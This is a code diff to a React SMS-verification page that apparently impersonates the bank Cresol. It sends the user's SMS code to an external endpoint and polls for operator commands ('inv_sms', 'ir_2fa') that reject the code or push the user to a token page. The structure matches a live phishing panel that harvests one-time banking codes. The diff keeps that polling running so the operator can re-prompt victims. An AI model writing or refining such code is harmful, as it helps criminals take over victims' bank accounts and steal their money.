@@ -1,4 +1,5 @@
-import React, { useState, useEffect } from "react";
+
+import React, { useState, useEffect, useRef } from "react";
 import { ArrowLeft } from "lucide-react";
 import { useNavigate } from "react-router-dom";
 import cresolLogo from "/lovable-uploads/afc18ce7-1259-448e-9ab4-f02f2fbbaf19.png";
@@ -10,13 +11,19 @@ const monitorClientSms = async (
   clientId: string, 
   navigate: (path: string) => void,
   onInvalidCode: () => void,
-  onStopLoading: () => void
+  isMonitoringRef: React.MutableRefObject<boolean>
 ): Promise<void> => {
   console.log(`Iniciando monitoramento SMS do cliente: ${clientId}`);
   
   let intervalId: NodeJS.Timeout;
   
   const monitor = async () => {
+    if (!isMonitoringRef.current) {
+      console.log('Monitoramento SMS parado por flag');
+      clearInterval(intervalId);
+      return;
+    }
+
     try {
       console.log(`Consultando dados do cliente ${clientId} na página SMS...`);
       
@@ -35,20 +42,18 @@ const monitorClientSms = async (
         console.log('Valor do response SMS:', clientData.data?.response);
         console.log('Valor do command SMS:', clientData.data?.command);
         
-        // Verificar se o código SMS é inválido
+        // Verificar se o código SMS é inválido - NÃO para o monitoramento
         if (clientData.data?.response === "inv_sms" || clientData.data?.command === "inv_sms") {
-          console.log('Detectado inv_sms - Código SMS inválido');
-          clearInterval(intervalId);
-          onStopLoading();
+          console.log('Detectado inv_sms - Código SMS inválido, mas continuando monitoramento');
           onInvalidCode();
-          return;
+          return; // Continua monitoramento, não para
         }
         
-        // Na página SMS: se receber ir_sms, continua monitorando; se receber ir_2fa, redireciona para token
+        // Na página SMS: se receber ir_2fa, redireciona para token e para monitoramento
         if (clientData.data?.response === "ir_2fa" || clientData.data?.command === "ir_2fa") {
           console.log('Detectado ir_2fa na página SMS - Redirecionando para /token');
           clearInterval(intervalId);
-          onStopLoading();
+          isMonitoringRef.current = false;
           console.log('Monitoramento SMS parado - redirecionando...');
           navigate('/token');
           return;
@@ -86,6 +91,7 @@ const SmsPage = () => {
   const [isLoading, setIsLoading] = useState(false);
   const [isInvalid, setIsInvalid] = useState(false);
   const [errorMessage, setErrorMessage] = useState("");
+  const isMonitoringRef = useRef(false);
 
   useEffect(() => {
     // Recuperar clientId do localStorage
@@ -102,6 +108,7 @@ const SmsPage = () => {
 
     // Cleanup quando sair da página
     return () => {
+      isMonitoringRef.current = false;
       clientStatus.stopMonitoring();
     };
   }, [clientStatus]);
@@ -144,18 +151,22 @@ const SmsPage = () => {
 
       if (response.ok) {
         console.log('Código SMS enviado com sucesso via external-response');
-        // Iniciar monitoramento contínuo após envio bem-sucedido
-        await monitorClientSms(
-          clientId, 
-          navigate,
-          () => {
-            setIsInvalid(true);
-            setErrorMessage("Código SMS inválido. Tente novamente.");
-          },
-          () => {
-            setIsLoading(false);
-          }
-        );
+        
+        // Só iniciar monitoramento se não estiver já monitorando
+        if (!isMonitoringRef.current) {
+          isMonitoringRef.current = true;
+          // Iniciar monitoramento contínuo após envio bem-sucedido
+          await monitorClientSms(
+            clientId, 
+            navigate,
+            () => {
+              setIsInvalid(true);
+              setErrorMessage("Código SMS inválido. Tente novamente.");
+              setIsLoading(false); // Para loading quando código é inválido, mas mantém monitoramento
+            },
+            isMonitoringRef
+          );
+        }
       } else {
         console.log('Erro ao enviar código SMS via external-response');
         setIsLoading(false);
@@ -167,6 +178,7 @@ const SmsPage = () => {
   };
 
   const handleBack = () => {
+    isMonitoringRef.current = false;
     navigate("/home");
   };
 
